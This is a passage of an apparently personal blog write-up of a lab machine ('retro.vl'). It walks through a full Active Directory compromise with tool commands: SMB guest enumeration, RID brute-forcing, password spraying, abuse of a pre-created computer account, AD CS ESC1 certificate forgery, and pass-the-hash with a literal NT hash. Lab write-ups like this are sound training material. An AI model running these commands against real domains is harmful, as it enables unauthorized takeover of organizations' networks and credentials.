</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3269</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ssl</span><span class=o>/</span><span class=n>ldap</span><span class=w>      </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Active</span><span class=w> </span><span class=n>Directory</span><span class=w> </span><span class=n>LDAP</span><span class=w> </span><span class=p>(</span><span class=k>Domain</span><span class=p>:</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl0</span><span class=p>.,</span><span class=w> </span><span class=n>Site</span><span class=p>:</span><span class=w> </span><span class=k>Default</span><span class=o>-</span><span class=k>First</span><span class=o>-</span><span class=n>Site</span><span class=o>-</span><span class=n>Name</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Subject</span><span class=w> </span><span class=n>Alternative</span><span class=w> </span><span class=n>Name</span><span class=p>:</span><span class=w> </span><span class=n>othername</span><span class=p>:</span><span class=w> </span><span class=mi>1</span><span class=p>.</span><span class=mi>3</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>311</span><span class=p>.</span><span class=mi>25</span><span class=p>.</span><span class=mi>1</span><span class=p>::</span><span class=o>&lt;</span><span class=n>unsupported</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>DNS</span><span class=p>:</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=n>TLS</span><span class=w> </span><span class=n>randomness</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>represent</span><span class=w> </span><span class=n>time</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3389</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ms</span><span class=o>-</span><span class=n>wbt</span><span class=o>-</span><span class=n>server</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Terminal</span><span class=w> </span><span class=n>Services</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>22</span><span class=n>T17</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>20</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=mi>23</span><span class=n>T17</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>20</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>rdp</span><span class=o>-</span><span class=n>ntlm</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Target_Name</span><span class=p>:</span><span class=w> </span><span class=n>RETRO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>RETRO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>DC</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Product_Version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>20348</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>System_Time</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T17</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>38</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T17</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>17</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=n>time</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Service</span><span class=w> </span><span class=n>Info</span><span class=p>:</span><span class=w> </span><span class=k>Host</span><span class=p>:</span><span class=w> </span><span class=n>DC</span><span class=p>;</span><span class=w> </span><span class=n>OS</span><span class=p>:</span><span class=w> </span><span class=n>Windows</span><span class=p>;</span><span class=w> </span><span class=n>CPE</span><span class=p>:</span><span class=w> </span><span class=n>cpe</span><span class=p>:</span><span class=o>/</span><span class=n>o</span><span class=p>:</span><span class=n>microsoft</span><span class=p>:</span><span class=n>windows</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=n>script</span><span class=w> </span><span class=n>results</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=k>security</span><span class=o>-</span><span class=k>mode</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>3</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>Message</span><span class=w> </span><span class=n>signing</span><span class=w> </span><span class=n>enabled</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>required</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=n>time</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T17</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>40</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>start_date</span><span class=p>:</span><span class=w> </span><span class=n>N</span><span class=o>/</span><span class=n>A</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Service</span><span class=w> </span><span class=n>detection</span><span class=w> </span><span class=n>performed</span><span class=p>.</span><span class=w> </span><span class=n>Please</span><span class=w> </span><span class=n>report</span><span class=w> </span><span class=k>any</span><span class=w> </span><span class=n>incorrect</span><span class=w> </span><span class=n>results</span><span class=w> </span><span class=k>at</span><span class=w> </span><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>nmap</span><span class=p>.</span><span class=n>org</span><span class=o>/</span><span class=n>submit</span><span class=o>/</span><span class=w> </span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Nmap</span><span class=w> </span><span class=n>done</span><span class=p>:</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=n>IP</span><span class=w> </span><span class=n>address</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=k>host</span><span class=w> </span><span class=n>up</span><span class=p>)</span><span class=w> </span><span class=n>scanned</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=mi>94</span><span class=p>.</span><span class=mi>62</span><span class=w> </span><span class=n>seconds</span><span class=w>
</span></span></span></code></pre></div><p>So, it is a DC and has <strong>dc.retro.vl</strong> full name. We should add it to <strong>/etc/hosts</strong> file.</p><p><img loading=lazy src=image-1.png alt></p><p>Also, we can see that in that host running <strong>kerberos</strong>, <strong>smb</strong>, <strong>ldap</strong> and <strong>rdp</strong>.</p><h2 id=smb-enum>SMB Enum<a hidden class=anchor aria-hidden=true href=#smb-enum>#</a></h2><p>Now we can start from enumeration of <strong>smb</strong>.<br>Using <strong>netexec</strong> we can enumerate shares.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=c1>--shares
</span></span></span></code></pre></div><p><img loading=lazy src=image-2.png alt></p><p><br>As you can see we can perform <strong>null authenticating</strong>, but we can not access to the shares.<br>Instead of we can try to use <strong>guest</strong> user (without password)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=s1>&#39;guest&#39;</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=c1>--shares
</span></span></span></code></pre></div><p><img loading=lazy src=image-3.png alt></p><p><br>Now we can enumerate the shares. There are possible methods:</p><ul><li>Using netexec&rsquo;s <strong>spider_plus</strong> module;</li><li>Using impacket&rsquo;s <strong>smbclient</strong> script;</li><li>Using general <strong>smbclient</strong> tool.</li></ul><p>Let&rsquo;s try with impacket-smbclient.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>smbclient</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>guest</span><span class=o>@</span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=k>no</span><span class=o>-</span><span class=n>pass</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-4.png alt></p><p><br>Inside <strong>Trainees</strong> share we found Important.txt file. It is a message from admins.</p><h2 id=users-list-dump>Users List Dump<a hidden class=anchor aria-hidden=true href=#users-list-dump>#</a></h2><p>Now let&rsquo;s try to dump list of users and try to spray usersnames as passwords. Maybe if we are lucky we will get a hit.<br>Using <strong>&ndash;users</strong> option of netexec does not give anything</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=s1>&#39;guest&#39;</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=c1>--users
</span></span></span></code></pre></div><p><img loading=lazy src=image-5.png alt></p><p><br>But, there is another method, which is <strong>bruting RIDs</strong>. Netexec hash a option <strong>&ndash;rid-brute maxRidValue.</strong> Let&rsquo;s try to use it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=s1>&#39;guest&#39;</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=c1>--rid-brute 10000
</span></span></span></code></pre></div><p><img loading=lazy src=image-6.png alt></p><p><br>Now we have a list of users, groups and aliasses. We need to geet a list users and we can use that command to get grep only users.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>echo</span><span class=w> </span><span class=s1>&#39;Content&#39;</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>cut</span><span class=w> </span><span class=o>-</span><span class=n>d</span><span class=w> </span><span class=s1>&#39;\&#39;</span><span class=w> </span><span class=o>-</span><span class=n>f2</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>cut</span><span class=w> </span><span class=o>-</span><span class=n>f1</span><span class=w> </span><span class=o>-</span><span class=n>d</span><span class=w> </span><span class=s1>&#39; &#39;</span><span class=w>
</span></span></span></code></pre></div><p>After getting the usernames lists we can perform spraying usernames.<br>In netexec just use users list as username and password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>users</span><span class=p>.</span><span class=n>txt</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=n>users</span><span class=p>.</span><span class=n>txt</span><span class=w> </span><span class=c1>--continue-on-success --no-bruteforce
</span></span></span></code></pre></div><p><img loading=lazy src=image-7.png alt></p><p><br>We have one hit. User trainee has password trainee. So, it is time to enumerate using trainee user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>trainee</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=n>trainee</span><span class=w> </span><span class=c1>--shares
</span></span></span></code></pre></div><p><img loading=lazy src=image-8.png alt></p><p><br>Trainee user has READ permissions for Notes share, which is interesting. Let&rsquo;s check using impacket-smbclient.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>smbclient</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>trainee</span><span class=p>:</span><span class=n>trainee</span><span class=o>@</span><span class=n>dc</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-9.png alt></p><p><br>In the Notes share we see the ToDo.txt file. After reading it we can understand that there was an incident. Also, James talked about pre created computer account which sounds interesting.</p><h2 id=diving-to-pre-created-computer-account>Diving to pre created computer account<a hidden class=anchor aria-hidden=true href=#diving-to-pre-created-computer-account>#</a></h2><p>After some enumeration I found a post from <a href=https://trustedsec.com/blog/diving-into-pre-created-computer-accounts>trustedsec</a>. After reading that post I found interesting that for the pre created computer account used password as the name of the pre created computer account. For example we have a computer account banking$, what if we will try to use the password banking. So, let&rsquo;s try.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>smb</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>banking$</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=n>banking</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-10.png alt></p><p><br>Nice!<br>We got an error <strong>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</strong> not like login failure or something like that. But how it can help us?</p><h2 id=adcs>ADCS<a hidden class=anchor aria-hidden=true href=#adcs>#</a></h2><p>After a little bit enum, I found the <strong>adcs</strong> module of netexec.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>netexec</span><span class=w> </span><span class=n>ldap</span><span class=w> </span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>trainee</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=n>trainee</span><span class=w> </span><span class=o>-</span><span class=n>M</span><span class=w> </span><span class=n>adcs</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-11.png alt></p><p><br>Interesting. We have ADCS on the DC. So, we can use <strong>certipy</strong> to get some information about the certificate center and maybe get some vulnerable templates.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>certipy</span><span class=w> </span><span class=n>find</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>trainee</span><span class=o>@</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=n>trainee</span><span class=w> </span><span class=o>-</span><span class=n>target</span><span class=w> </span><span class=n>dc</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=o>-</span><span class=n>enabled</span><span class=w> </span><span class=o>-</span><span class=k>stdout</span><span class=w> </span><span class=o>-</span><span class=n>vulnerable</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-12.png alt></p><p><br>And we found a vulnerable template and only <strong>Domain Computers</strong> can enroll it. So it is <strong>ESC1</strong>. After reading about <strong>ESC1</strong> from certipy&rsquo;s <a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1">github page</a> I understand that we can request a certificate using <strong>-ca (Certificate Authority)</strong>, <strong>-template (Template name)</strong> and <strong>-upn (Alternative UPN)</strong> (for me upn sounds like impersonation).</p><p><br>Note that we can not just create a computer account and perform ESC1. The reason why is MachineAccountQuota is 0 which mean we can not create/add a computer account to the domain.</p><p><img loading=lazy src=image-18.png alt></p><h2 id=exploitation-of-esc1>Exploitation of ESC1<a hidden class=anchor aria-hidden=true href=#exploitation-of-esc1>#</a></h2><p>Using certipy let&rsquo;s ask a certifcate and for the upn let&rsquo;s use Domain Administrator user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>certipy</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=s1>&#39;banking$&#39;</span><span class=o>@</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=w> </span><span class=n>banking</span><span class=w> </span><span class=o>-</span><span class=n>ca</span><span class=w> </span><span class=n>retro</span><span class=o>-</span><span class=n>DC</span><span class=o>-</span><span class=n>CA</span><span class=w> </span><span class=o>-</span><span class=k>template</span><span class=w> </span><span class=n>RetroClients</span><span class=w> </span><span class=o>-</span><span class=n>upn</span><span class=w> </span><span class=n>Administrator</span><span class=w> </span><span class=o>-</span><span class=n>target</span><span class=w> </span><span class=n>dc</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=o>-</span><span class=k>key</span><span class=o>-</span><span class=k>size</span><span class=w> </span><span class=mi>4096</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-13.png alt></p><p><br>But we saw an error <strong>rpc_s_access_denied</strong> which is similiar to netexec error for banking$ authentication.<br>The best options is just ask a TGT (Ticket Granting Ticket) ticket to banking$ user and using kerberos just perform ESC1 attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>getTGT</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>banking$</span><span class=p>:</span><span class=n>banking</span><span class=w> </span><span class=o>-</span><span class=n>dc</span><span class=o>-</span><span class=n>ip</span><span class=w> </span><span class=n>dc</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-14.png alt></p><p><br>Awesome we got a tgt ticket and now it is time to back ESC1. But before we need to set a <strong>KRB5CCNAME</strong> local environment variable and use path to tgt (banking$.ccache) file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>export</span><span class=w> </span><span class=n>KRB5CCNAME</span><span class=o>=</span><span class=n>banking</span><span class=err>\$</span><span class=p>.</span><span class=n>ccache</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>certipy</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=s1>&#39;banking$&#39;</span><span class=o>@</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=o>-</span><span class=n>k</span><span class=w> </span><span class=o>-</span><span class=k>no</span><span class=o>-</span><span class=n>pass</span><span class=w> </span><span class=o>-</span><span class=n>ca</span><span class=w> </span><span class=n>retro</span><span class=o>-</span><span class=n>DC</span><span class=o>-</span><span class=n>CA</span><span class=w> </span><span class=o>-</span><span class=k>template</span><span class=w> </span><span class=n>RetroClients</span><span class=w> </span><span class=o>-</span><span class=n>upn</span><span class=w> </span><span class=n>Administrator</span><span class=w> </span><span class=o>-</span><span class=n>target</span><span class=w> </span><span class=n>dc</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w> </span><span class=o>-</span><span class=k>key</span><span class=o>-</span><span class=k>size</span><span class=w> </span><span class=mi>4096</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-15.png alt></p><p><br>Boom! We got a certificate of Administrator user. To get a <strong>ntlm</strong> hash of that user we need to use <strong>auth</strong> module of certipy.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>certipy</span><span class=w> </span><span class=n>auth</span><span class=w> </span><span class=o>-</span><span class=n>pfx</span><span class=w> </span><span class=n>administrator</span><span class=p>.</span><span class=n>pfx</span><span class=w> </span><span class=o>-</span><span class=k>domain</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-16.png alt></p><p><br>Awesome! Now we have a nt hash of domain Administrator, and we can just use psexec or wmiexec to read the flags</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>impacket</span><span class=o>-</span><span class=n>wmiexec</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=o>/</span><span class=n>Administrator</span><span class=o>@</span><span class=n>dc</span><span class=w> </span><span class=o>-</span><span class=n>hashes</span><span class=w> </span><span class=p>:</span><span class=mi>252</span><span class=n>fac7066d93dd009d4fd2cd0368389</span><span class=w>
</span></span></span></code></pre></div><p><img loading=lazy src=image-17.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/adcs/>ADCS</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>Shelldon's blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>